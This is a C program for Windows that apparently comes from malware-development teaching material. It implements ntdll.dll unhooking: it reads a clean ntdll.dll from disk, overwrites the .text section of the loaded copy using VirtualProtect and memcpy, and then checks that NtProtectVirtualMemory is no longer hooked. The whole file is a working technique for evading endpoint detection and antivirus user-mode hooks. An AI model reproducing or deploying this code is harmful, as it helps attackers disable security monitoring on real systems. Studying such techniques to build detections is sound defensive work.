#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#define NTDLL "NTDLL.DLL" // can be lower-case as well

BOOL ReadNtdllFromDisk(
	_Out_ PVOID* ppNtdllBuf
) {

	CHAR	cWinPath	[MAX_PATH / 2]		= { 0 };
	CHAR	cNtdllPath	[MAX_PATH]			= { 0 };
	HANDLE	hFile							= NULL;
	DWORD	dwNumberOfBytesRead				= NULL,
			dwFileLen						= NULL;
	PVOID	pNtdllBuffer					= NULL;

	// getting the path of the Windows directory
	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// 'sprintf_s' is a more secure version than 'sprintf'
	sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

	// getting the handle of the ntdll.dll file
	hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// allocating enough memory to read the ntdll.dll file
	dwFileLen		= GetFileSize(hFile, NULL);
	pNtdllBuffer	= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen);

	// reading the file
	if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, &dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", dwNumberOfBytesRead, dwFileLen);
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hFile)
		CloseHandle(hFile);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}

PVOID FetchLocalNtdllBaseAddress(
	_In_ VOID
) {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'DiskHooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}


BOOL ReplaceNtdllTxtSection(
	_In_ PVOID pUnhookedNtdll
) {

	PVOID				pLocalNtdll		= (PVOID)FetchLocalNtdllBaseAddress();

	printf("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr	= (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;
	
	// getting the nt headers
	PIMAGE_NT_HEADERS pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
				pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= NULL; // the size of the text section

	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
	
	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
		
		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);

			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);

			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	printf("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();
	
	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		printf("\t[i] Text section is of offset 4096, updating base address ... \n");
		// if not, then the read text section is also of offset 4096, so we add 3072 (because we added 1024 already)
		pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pRemoteNtdllTxt + 3072);
		// checking again
		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
			return FALSE;
		printf("\t[+] New Address : 0x%p \n", pRemoteNtdllTxt);
		printf("[#] Press <Enter> To Continue ... ");
		getchar();
	}
	
	printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	
	// restoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");
	
	return TRUE;
}

VOID PrintState(
	_In_ char* cSyscallName, 
	_In_ PVOID pSyscallAddress
) {
	printf("[#] %s [ 0x%p ] ---> %s \n", cSyscallName, pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");
}

int main(
	_In_ VOID
) {

	PVOID	pNtdll		= NULL;
	
	// check if NtProtectVirtualMemory is hooked
	PrintState("NtProtectVirtualMemory", GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));

	printf("[i] Fetching A New \"ntdll.dll\" File By Reading \n");
	if (!ReadNtdllFromDisk(&pNtdll))
		return -1;

	if (!ReplaceNtdllTxtSection(pNtdll))
		return -1;

	HeapFree(GetProcessHeap(), 0, pNtdll);

	printf("[+] Ntdll Unhooked Successfully \n");

	// check if NtProtectVirtualMemory is unhooked
	PrintState("NtProtectVirtualMemory", GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}